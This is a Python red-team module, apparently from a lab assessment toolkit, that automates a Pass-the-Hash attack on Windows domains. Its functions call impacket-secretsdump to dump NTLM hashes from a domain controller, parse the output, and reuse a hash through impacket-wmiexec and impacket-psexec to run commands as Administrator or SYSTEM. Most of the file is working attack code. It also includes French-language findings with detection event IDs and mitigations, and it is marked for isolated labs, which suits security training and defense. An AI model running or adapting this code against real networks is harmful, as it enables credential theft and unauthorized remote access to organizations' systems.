"""
Red Team - Pass-the-Hash (PtH)
================================
MITRE ATT&CK: T1550.002 - Use Alternate Authentication Material: Pass the Hash

NTLM authentication uses a hash of the user's password rather than the
password itself. An attacker who obtains an NTLM hash (via secretsdump,
Mimikatz, or Responder) can authenticate as that user without knowing the
plaintext password.

Attack flow:
    1. Extract NTLM hashes from the DC using Impacket secretsdump (if admin)
    2. Use the hash to authenticate via WMIExec (stealthier) or PsExec (louder)
    3. Execute commands remotely as the compromised user

Detection indicators:
    - Event ID 4624: Logon type 3 (network) with Administrator account
    - Event ID 4648: Logon using explicit credentials (PtH pattern)
    - Wazuh Rules 18107, 60301: Pass-the-Hash detection

Mitigation:
    - Enable Windows Defender Credential Guard
    - Deploy LAPS (Local Admin Password Solution) for unique local passwords
    - Disable NTLMv1, enforce NTLMv2 minimum
    - Add sensitive accounts to the Protected Users security group

⚠  FOR USE IN ISOLATED LAB ENVIRONMENTS ONLY.
"""

import subprocess
import re
import os
from datetime import datetime

from utils.format_utils import print_info, print_warning, print_success, print_error

ATTACK_META = {
    "name":      "Pass-the-Hash",
    "phase":     "Privilege Escalation / Lateral Movement",
    "mitre":     "T1550.002",
    "risk":      "Critique",
    "event_ids": [4624, 4625, 4648],
    "tools":     ["Impacket (psexec/wmiexec)", "CrackMapExec", "Mimikatz"],
    "description": (
        "Le protocole NTLM authentifie avec le hash du mot de passe plutôt qu'avec le mot "
        "de passe en clair. Un attaquant qui a obtenu un hash NTLM (via DCSync, dump LSASS, "
        "etc.) peut donc s'authentifier directement avec ce hash, sans jamais avoir besoin "
        "de le craquer."
    ),
}


def run_attack(target: str = "192.168.56.11", domain: str = "domain.local",
               user: str = "Administrator",
               ntlm_hash: str = None,
               dump_hashes: bool = True,
               **kwargs) -> dict:
    """
    Pass-the-Hash simulation:
    1. (Optionnel) Extraire des hashes NTLM via secretsdump
    2. Réutiliser le hash pour s'authentifier sur la cible
    3. Tenter d'obtenir un shell / accès distant
    """
    print_warning(f"[RED TEAM] Pass-the-Hash → {target} (user: {user})")

    findings = []
    hashes   = {}
    access   = []

    # Step 1: Dump hashes if not provided
    if ntlm_hash is None and dump_hashes:
        print_info("Extraction des hashes NTLM depuis le DC (secretsdump)...")
        hashes = _secretsdump(domain, target, kwargs.get('password', ''))
        if hashes:
            ntlm_hash = next(iter(hashes.values()))  # Use first found hash
            findings.append({
                "risk":        "Critique",
                "title":       f"{len(hashes)} hash(es) NTLM extrait(s) du DC",
                "description": (
                    f"Comptes : {', '.join(list(hashes.keys())[:8])}. "
                    "Ces hashes permettent une authentification directe sans mot de passe clair."
                ),
                "mitigation":  (
                    "1. Activer Protected Users Security Group.\n"
                    "2. Désactiver NTLMv1 via GPO.\n"
                    "3. Implémenter LAPS (Local Admin Password Solution).\n"
                    "4. Restreindre les droits de replication AD."
                ),
                "event_ids": [4662],
            })
        else:
            findings.append({
                "risk":        "Info",
                "title":       "Extraction de hashes impossible - droits insuffisants",
                "description": "secretsdump nécessite des droits Domain Admin ou replication.",
                "mitigation":  "Surveiller l'Event ID 4662 (DCSync) et les accès DRSUAPI.",
                "event_ids":   [4662],
            })

    if not ntlm_hash:
        findings.append({
            "risk":        "Info",
            "title":       "PtH non exécuté - aucun hash disponible",
            "description": "Fournir un hash NTLM via --ntlm-hash ou activer dump_hashes.",
            "mitigation":  "N/A",
            "event_ids":   [],
        })
        return _build_result("partial", findings, hashes, access)

    # Step 2: Authenticate using the hash
    print_info(f"Tentative PtH avec {user}:{ntlm_hash[:16]}…")

    # Try wmiexec (stealthier)
    wmi_result = _pth_wmiexec(target, domain, user, ntlm_hash)
    if wmi_result:
        access.append({"method": "WMI", "target": target, "user": user})
        findings.append({
            "risk":        "Critique",
            "title":       f"Accès WMI obtenu via PtH sur {target}",
            "description": (
                f"Commande exécutée sur {target} en tant que {user} "
                "sans connaître le mot de passe en clair. "
                f"Résultat : {wmi_result[:200]}"
            ),
            "mitigation":  (
                "1. Désactiver l'authentification NTLM (forcer Kerberos).\n"
                "2. Activer le credential guard (Windows Defender Credential Guard).\n"
                "3. Bloquer WMI distant via pare-feu (port TCP 135 + dynamique).\n"
                "4. Utiliser LAPS pour des mots de passe locaux uniques."
            ),
            "mitigation_technique": (
                "1. Désactiver NTLM : Computer Configuration > Policies > Security Settings > "
                "Local Policies > Security Options > Network security: Restrict NTLM = DENY ALL.\n"
                "2. Forcer Kerberos via GPO (Network Security: Restrict NTLM: Outgoing NTLM traffic).\n"
                "3. Activer Credential Guard via Group Policy (déployer sur tous les serveurs).\n"
                "4. Bloquer les ports WMI (TCP 135, TCP 4...) via pare-feu ou ACLs réseau.\n"
                "5. Monitorer Event ID 4624 type 3/9 anormal, 4648 (Explicit Credentials).\n"
                "6. Implémenter SMB Signing obligatoire."
            ),
            "mitigation_humaine": (
                "Former les administrateurs que le Pass-the-Hash met en péril les hashes des comptes admin. "
                "Établir une procédure : ne jamais stocker les hashes d'Admin/DA, utiliser des comptes spécifiques "
                "pour les tâches admin. Auditer mensuellement qui a accès à WMI. Intégrer un test d'accès WMI "
                "au checklist de sécurité post-déploiement."
            ),
            "impact": (
                f"Authentification réussie sur {target} avec un hash NTLM sans connaître le mot de passe. "
                "Exécution de commande à distance, accès au serveur, escalade vers système d'autres machines."
            ),
            "logs_siem": [
                {"event_id": 4624, "description": "Logon avec hash (type 3 ou 9, NTLMv2)"},
                {"event_id": 4648, "description": "Explicit Credentials used — indicateur de PtH"},
                {"event_id": 4688, "description": "Process creation anormale via WMI"},
            ],
            "event_ids": [4624, 4648],
        })

    # Try psexec (louder but reliable)
    psexec_result = _pth_psexec(target, domain, user, ntlm_hash)
    if psexec_result:
        access.append({"method": "PsExec", "target": target, "user": user})
        findings.append({
            "risk":        "Critique",
            "title":       f"Shell SYSTEM obtenu via PsExec+PtH sur {target}",
            "description": (
                f"Accès SYSTEM obtenu sur {target} via Pass-the-Hash + PsExec. "
                "Escalade vers SYSTEM depuis le hash d'Administrator."
            ),
            "mitigation":  (
                "1. Désactiver l'accès ADMIN$ et IPC$ via GPO.\n"
                "2. Restreindre les partages administratifs (AutoShareServer=0).\n"
                "3. Monitorer Event ID 4624 type logon 3 + compte Administrator."
            ),
            "mitigation_technique": (
                "1. Restreindre les partages administratifs : Computer Configuration > Policies > "
                "Administrative Templates > Network > Lanman Server > AutoShareServer = 0.\n"
                "2. Bloquer ADMIN$ et IPC$ via ACL ou restiction de partages.\n"
                "3. Désactiver NTLM obligatoirement (forcer Kerberos).\n"
                "4. SMB Signing obligatoire sur tous les serveurs.\n"
                "5. Bloquer les ports PsExec (TCP 445 administratifs) via pare-feu.\n"
                "6. Monitorer Event ID 4624 (logon SYSTEM anormal), 7045 (service creation), 4688 (process)."
            ),
            "mitigation_humaine": (
                "Ne jamais utiliser les hashes d'Administrator pour des tâches automatisées. Créer des comptes "
                "de service spécifiques avec privilèges minimaux. Former les admins à ne pas exécuter de tâches "
                "critiques avec des hashes ou cleartext credentials. Auditer mensuellement l'accès aux partages ADMIN$. "
                "Établir une procédure d'alerte pour tout Event ID 7045 (service install) suspecte."
            ),
            "impact": (
                "Accès SYSTEM complet sur le serveur cible. Création de services persistants, accès à toutes les "
                "données, escalade verso d'autres serveurs/domaines, exfiltration, destruction."
            ),
            "logs_siem": [
                {"event_id": 4624, "description": "Logon type 3 anormal avec compte privilegié (PsExec)"},
                {"event_id": 4648, "description": "Explicit Credentials — indicateur de PtH"},
                {"event_id": 7045, "description": "Service PSEXESVC installed — pattern de PsExec"},
                {"rule": "Wazuh 65010 (exemple)", "description": "SMB admin share access pattern"},
            ],
            "event_ids": [4624, 7045, 4648],
        })

    if not access:
        findings.append({
            "risk":        "Moyen",
            "title":       "PtH tenté mais accès refusé sur la cible",
            "description": (
                "L'authentification avec le hash a échoué. "
                "Possible protection : Credential Guard, NTLM restrictions, ou pare-feu."
            ),
            "mitigation":  "Bonne pratique - documenter et maintenir ces protections.",
            "event_ids":   [4625],
        })

    return _build_result("success", findings, hashes, access)


# ── Private ───────────────────────────────────────────────────────────────────

def _secretsdump(domain: str, target: str, password: str = '') -> dict:
    """Extract NTLM hashes via impacket secretsdump."""
    hashes = {}
    try:
        result = subprocess.run(
            [
                "impacket-secretsdump",
                f"{domain}/administrator:{password}@{target}",
                "-just-dc-ntlm",
            ],
            capture_output=True, text=True, timeout=60
        )
        # Parse format: domain\user:rid:LM:NTLM:::
        for line in result.stdout.splitlines():
            m = re.match(r"(?:[\w.]+\\)?(\w+):\d+:[a-f0-9]{32}:([a-f0-9]{32}):::", line)
            if m:
                hashes[m.group(1)] = m.group(2)
    except Exception:
        pass
    return hashes


def _pth_wmiexec(target: str, domain: str, user: str, ntlm_hash: str) -> str | None:
    """Attempt remote WMI execution via PtH."""
    lm_part   = "aad3b435b51404eeaad3b435b51404ee"
    full_hash = f"{lm_part}:{ntlm_hash}" if ":" not in ntlm_hash else ntlm_hash
    try:
        result = subprocess.run(
            [
                "impacket-wmiexec",
                f"{domain}/{user}@{target}",
                "-hashes", full_hash,
                "whoami /all",
            ],
            capture_output=True, text=True, timeout=20
        )
        if result.returncode == 0 and result.stdout.strip():
            return result.stdout.strip()
    except Exception:
        pass
    return None


def _pth_psexec(target: str, domain: str, user: str, ntlm_hash: str) -> str | None:
    """Attempt PsExec via PtH."""
    lm_part   = "aad3b435b51404eeaad3b435b51404ee"
    full_hash = f"{lm_part}:{ntlm_hash}" if ":" not in ntlm_hash else ntlm_hash
    try:
        result = subprocess.run(
            [
                "impacket-psexec",
                f"{domain}/{user}@{target}",
                "-hashes", full_hash,
                "whoami",
            ],
            capture_output=True, text=True, timeout=20
        )
        if result.returncode == 0 and result.stdout.strip():
            return result.stdout.strip()
    except Exception:
        pass
    return None


def _build_result(status: str, findings: list, hashes: dict, access: list) -> dict:
    return {
        "module":      "red_team.pth",
        "status":      status,
        "timestamp":   datetime.now().isoformat(),
        "attack_meta": ATTACK_META,
        "findings":    findings,
        "artifacts": {
            "ntlm_hashes":    hashes,
            "access_obtained": access,
        },
        "iocs": [
            {"type": "event_id", "value": 4624,
             "description": "Logon type 3 avec compte Admin - surveiller l'origine"},
            {"type": "event_id", "value": 4648,
             "description": "Logon avec credentials explicites (PtH pattern)"},
        ],
        "summary": {
            "hashes_dumped":  len(hashes),
            "access_obtained": len(access),
            "methods":        [a["method"] for a in access],
        },
    }
